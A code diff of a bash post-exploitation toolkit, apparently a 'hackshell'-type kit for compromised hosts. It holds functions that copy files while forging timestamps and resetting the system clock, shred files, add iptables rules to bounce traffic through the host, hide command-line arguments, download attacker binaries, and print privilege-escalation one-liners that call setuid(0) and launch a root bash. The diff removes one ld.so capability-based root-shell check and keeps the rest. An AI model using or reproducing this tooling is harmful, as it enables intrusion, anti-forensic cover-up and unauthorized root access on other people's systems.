@@ -139,7 +139,7 @@ notime_cp() {
             chmod --reference "$src" "$dst"
             touch -t "$olddir_date" "$dir"  # Changes ctime
             chmod --reference "$dir" "$dir" # Fixes ctime
-            # [[ -n "$now" ]] && 
+            # [[ -n "$now" ]] &&
             date --set="$now" >/dev/null
             unset olddir_date
         }
@@ -184,11 +184,15 @@ transfer() {
 }
 
 # SHRED without shred command
-command -v shred >/dev/null || shred() {
+custom_shred() {
     [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
-    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
+    dd status=none bs=1k count=$(du -sk "${1:?}" | cut -f1) if=/dev/urandom of="$1"
     rm -f "${1:?}"
 }
+
+if ! command -v shred >/dev/null; then
+    alias shred='custom_shred'
+fi
 
 bounceinit() {
     [[ -n "$_is_bounceinit" ]] && return
@@ -197,12 +201,12 @@ bounceinit() {
     echo 1 >/proc/sys/net/ipv4/ip_forward
     echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
     [ $# -le 0 ] && {
-        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
+        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit."
         set -- "0.0.0.0/0"
     }
     while [ $# -gt 0 ]; do
         _hs_bounce_src+=("${1}")
-        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
         shift 1
     done
     iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
@@ -223,7 +227,7 @@ unbounce() {
     unset _hs_bounce_dst
 
     for x in "${_hs_bounce_src[@]}"; do
-        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
     done
     unset _hs_bounce_src
     iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
@@ -349,7 +353,7 @@ zapme() {
 
 # Find writeable dirctory but without displaying sub-folders
 # Usage: wfind /
-# Usage: wfind /etc /var /usr 
+# Usage: wfind /etc /var /usr
 wfind() {
     local arr dir
     local IFS
@@ -456,10 +460,10 @@ bin() {
     }
     unset _HS_SINGLE_MATCH
     [ -n "$is_showhelp" ] && {
-        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to download all" 
+        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to ignore systemwide binaries"
         echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
-        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options
->>> from your current shell and all further processes."
+        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line
+>>> options from your current shell and all further processes."
         echo -e ">>> ${CDG}Download COMPLETE${CN}"
     }
 
@@ -584,17 +588,6 @@ lootlight() {
             echo "${str}"
             echo -en "${CN}"
             echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
-        }
-
-        str="$( { readlink -f /lib64/ld-*.so.* || readlink -f /lib/ld-*.so.* || readlink -f /lib/ld-linux.so.2; } 2>/dev/null )"
-        [ -f "$str" ] && getcap "$str" 2>/dev/null | grep -qFm1 cap_setuid 2>/dev/null && {
-            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
-            getcap "${str}" 2>/dev/null
-            echo -en "${CN}"
-            # BUG: Linux yells 'Inconsistency detected by ld.so: rtld.c: 1327: _dl_start_args_adjust: Assertion `auxv == sp + 1' failed!'
-            # if TMPDIR=/dev/shm and ld.so is used to load binary.
-            echo -en "${CW}TIP: ${CDC}unset TMPDIR; $str $(command -v "${HS_PY:-python}") -c"
-            echo "\$'import os\ntry:\n\tos.setuid(0)\n\tos.setgid(0)\nexcept:\n\tpass\n''"'os.execl("/bin/bash", "-bash");'"'"
         }
     }
 
@@ -768,7 +761,7 @@ hs_init_dl() {
     # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
     if command -v curl >/dev/null; then
         _HS_SSL_ERR="certificate "
-        dl() { 
+        dl() {
             local opts=()
             [ -n "$UNSAFE" ] && opts=("-k")
             curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
